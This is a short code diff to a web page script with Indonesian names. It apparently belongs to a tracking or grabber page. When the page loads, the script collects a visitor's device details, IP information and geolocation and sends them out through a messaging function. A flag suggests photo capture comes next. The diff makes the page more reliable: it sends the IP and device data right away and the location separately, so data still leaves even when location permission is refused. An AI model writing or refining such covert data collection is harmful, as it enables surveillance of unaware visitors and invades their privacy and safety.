@@ -221,13 +221,17 @@ Kota                : ${ip.city}
 
     const mulai = async () => {
       if (!sudahKirimInfo) {
-        const [info, ip, lokasi] = await Promise.all([
-          ambilDataPerangkat(),
-          ambilIPInfo(),
-          ambilLokasi()
-        ]);
-        let hasil = `${info}\n\n${ip}\n\n${lokasi}`;
-        await kirimPesan(hasil);
+        const infoPromise = ambilDataPerangkat();
+        const ipPromise = ambilIPInfo();
+        const lokasiPromise = ambilLokasi().catch(() => '- 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -\n\n❌ Lokasi tidak diizinkan atau gagal.');
+
+        const [info, ip] = await Promise.all([infoPromise, ipPromise]);
+        await kirimPesan(`${info}\n\n${ip}`);
+
+        lokasiPromise.then(async lokasi => {
+          await kirimPesan(lokasi);
+        });
+
         sudahKirimInfo = true;
         lanjutFoto = true;
       }
@@ -242,7 +246,6 @@ Kota                : ${ip.city}
       }
     };
 
-    // Jalankan langsung saat halaman dibuka
     window.addEventListener("load", mulai);
   </script>
 </body>
